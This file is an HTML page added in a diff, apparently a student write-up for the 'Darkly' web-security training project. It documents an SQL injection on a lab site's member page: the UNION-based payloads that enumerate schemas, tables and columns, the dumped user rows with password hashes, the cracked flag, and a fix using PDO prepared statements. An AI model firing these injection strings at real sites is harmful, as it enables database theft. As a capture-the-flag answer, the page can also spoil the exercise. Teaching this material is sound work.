@@ -1,0 +1,240 @@
+<!doctype html>
+<html lang="fr">
+
+<head>
+  <meta charset="utf-8">
+  <title>Darkly - achoquel</title>
+  <script src="js/bootstrap.min.js"></script>
+  <link rel="stylesheet" href="../../WebViewer/css/bootstrap.min.css">
+  <link rel="stylesheet" href="../../WebViewer/css/custom.css">
+</head>
+
+<body>
+  <div id="wrapper">
+    <nav class="navbar navbar-dark bg-dark">
+      <div class="container-fluid">
+        <a class="navbar-brand" href="../../WebViewer/index.html">Darkly</a>
+      </div>
+    </nav>
+    <main class="container">
+      <div class="row">
+        <div class="col-md-12 mt-5">
+          <img src="../../WebViewer/img/sqli.png" class="img-thumbnail rounded mx-auto d-block img-top"
+            alt="SQL Injection">
+          <h1>SQL Injection on Member Page</h1>
+          <p class="lead">We can inject some malicious SQL requests on this page to obtain sensitive databases datas.
+          </p>
+          <hr>
+          <p class="lead">On the Member page, the field is waiting for an int to display the user information that
+            corresponds to the ID that we enter.</br>
+            We can list all the members at once by doing a simple injection:
+            <code>1 OR 1=1</code><br>
+
+            We see that we have 5 users, and one of them is named GetThe Flag.</br></br>
+
+            We can exploit this injection to dump the database by using an UNION injection:
+            <code>1 UNION ALL SELECT NULL, schema_name FROM information_schema.schemata--</code><br>
+
+            What it does is that we do our first querry normaly, and we do an UNION of the result with the result of our
+            injection query, in this case we get the databases name from the information_schema.</br></br>
+
+            By executing this request, we get 6 databases: </br></br>
+
+            - information_schema - This database holds all the structural informations and some metadatas. It will be
+            very helpful to scan each database and to get their structures.</br>
+            - Member_Brute_Force</br>
+            - Member_Sql_Injection</br>
+            - Member_guestbook</br>
+            - Member_images</br>
+            - Member_survey</br></br>
+
+            We can get the table structure of each database by doing:</br>
+            <code>1 UNION ALL SELECT NULL, table_name FROM information_schema.tables--</code><br>
+
+            - Member_Brute_Force -> db_default</br>
+            - Member_Sql_Injection -> users</br>
+            - Member_guestbook -> guestbook</br>
+            - Member_images -> list_images</br>
+            - Member_survey -> vote_dbs</br></br>
+
+            We can get the column structure of each tables by doing</br>
+            <code>1 UNION ALL SELECT NULL, column_name FROM information_schema.COLUMNS --</code><br>
+            If we assume that each table has an Id column as it's first column, we can safely say that the databases
+            tables structures are:</br>
+          <p>
+
+          <div class="table-responsive">
+            <table class="table table-sm table-hover table-bordered table-dark">
+              <thead>
+                <tr>
+                  <th scope="col"></th>
+                  <th scope="col">Member_Brute_Force</th>
+                  <th scope="col">Member_Sql_Injection</th>
+                  <th scope="col">Member_guestbook</th>
+                  <th scope="col">Member_images</th>
+                  <th scope="col">Member_survey</th>
+                </tr>
+              </thead>
+              <thead>
+                <tr>
+                  <th scope="col">Table</th>
+                  <th scope="col">db_default</th>
+                  <th scope="col">users</th>
+                  <th scope="col">guestbook</th>
+                  <th scope="col">list_images</th>
+                  <th scope="col">vote_dbs</th>
+                </tr>
+              </thead>
+              <tbody>
+
+                <tr>
+                  <th scope="row" rowspan="8">Columns</th>
+                  <td>id</td>
+                  <td>user_id</td>
+                  <td>id_comment</td>
+                  <td>id</td>
+                  <td>id_vote</td>
+                </tr>
+                <tr>
+                  <td>username</td>
+                  <td>first_name</td>
+                  <td>comment</td>
+                  <td>url</td>
+                  <td>vote</td>
+                </tr>
+                <tr>
+                  <td rowspan="6">password</td>
+                  <td>last_name</td>
+                  <td rowspan="6">name</td>
+                  <td>title</td>
+                  <td>nb_vote</td>
+                </tr>
+                <tr>
+                  <td>town</td>
+                  <td rowspan="5">comment</td>
+                  <td rowspan="5">subject</td>
+                </tr>
+                <tr>
+                  <td>country</td>
+                </tr>
+                <tr>
+                  <td>planet</td>
+                </tr>
+                <tr>
+                  <td>Commentaire</td>
+                </tr>
+                <tr>
+                  <td>countersign</td>
+                </tr>
+              </tbody>
+
+            </table>
+          </div>
+          <p class="lead">
+            On this page, it seems that we are using the Member_Sql_Injection database, so we are going to extract the
+            data of each entry of it's table</br>
+            <code>1 UNION ALL SELECT NULL, concat(user_id,0x3a,first_name,0x3a,last_name,0x3a,town,0x3a,country,0x3a,planet,0x3a,Commentaire,0x3a,countersign) FROM users--</code></br>
+            The result gives us all the info that we need to get the flag:</br>
+          </p>
+          <div class="table-responsive">
+            <table class="table table-striped table-hover table-bordered table-dark ">
+              <thead>
+                <tr>
+                  <th scope="col">user_id</th>
+                  <th scope="col">first_name</th>
+                  <th scope="col">last_name</th>
+                  <th scope="col">town</th>
+                  <th scope="col">country</th>
+                  <th scope="col">planet</th>
+                  <th scope="col">Commentaire</th>
+                  <th scope="col">countersign</th>
+                </tr>
+              </thead>
+              <tbody>
+                <tr>
+                  <th scope="row">1</th>
+                  <td>Barack Hussein</td>
+                  <td>Obama</td>
+                  <td>Honolulu</td>
+                  <td>America</td>
+                  <td>EARTH</td>
+                  <td>Amerca !</td>
+                  <td>2b3366bcfd44f540e630d4dc2b9b06d9</td>
+                </tr>
+                <tr>
+                  <th scope="row">2</th>
+                  <td>Adolf</td>
+                  <td>Hitler</td>
+                  <td>Berlin</td>
+                  <td>Allemagne</td>
+                  <td>Earth</td>
+                  <td>Ich spreche kein Deutsch.</td>
+                  <td>60e9032c586fb422e2c16dee6286cf10</td>
+                </tr>
+                <tr>
+                  <th scope="row">3</th>
+                  <td>Joseph</td>
+                  <td>Staline</td>
+                  <td>Moscou</td>
+                  <td>Russia</td>
+                  <td>Earth</td>
+                  <td>????? ????????????? ?????????</td>
+                  <td>e083b24a01c483437bcf4a9eea7c1b4d</td>
+                </tr>
+                <tr>
+                  <th scope="row">5</th>
+                  <td>Flag</td>
+                  <td>GetThe</td>
+                  <td>42</td>
+                  <td>42</td>
+                  <td>42</td>
+                  <td>Decrypt this password -> then lower all the char. Sh256 on it and it's good !</td>
+                  <td>5ff9d0165b4f92b14994e5c685cdce28</td>
+                </tr>
+              </tbody>
+
+            </table>
+          </div>
+          <p class="lead">
+            We decrypt the countersign of the user: 5ff9d0165b4f92b14994e5c685cdce28 -> FortyTwo</br>
+            To lower char: fortytwo</br>
+            Sh256 on it: 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5<br><br>
+            The flag is : 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5</p>
+        </div>
+      </div>
+      <div class="row">
+        <div class="col-md-12 mt-5">
+          <h2>Risks</h2>
+          <hr>
+          <p class="lead">With this vulnerability, we were able to dump all of the databases used by the website. The
+            risks are enormous.<br>A hacker could sell the datas, hack users other accounts, delete the database and
+            ask for a ransom in order to restore it, ... </p>
+        </div>
+      </div>
+      <div class="row">
+        <div class="col-md-12 mt-5">
+          <h2>How to fix ?</h2>
+          <hr>
+          <p class="lead">In this case, the request might be something like this:</br>
+            <code>SELECT user_id, first_name, last_name FROM users WHERE user_id = $_GET["id"]</code>
+            You should never put an user input directly inside a SQL request or any other data sensitive
+            request/function without verifying it. In this case, since the website is written in PHP, you can use PDO to
+            prepare the SQL request and avoid injections like this.<br>
+            For example:<br>
+            <code>
+//We verify if the value sent by the user is a number
+if (is_numeric($_GET["id"]))
+{
+  $request = $pdo->prepare("SELECT user_id, first_name, last_name FROM users WHERE user_id=:uid");
+  $request->bindParam(":uid", $_GET["id"]);
+  $request->execute();
+}
+            </code>
+          </p>
+        </div>
+      </div>
+    </main>
+  </div>
+</body>
+
+</html>
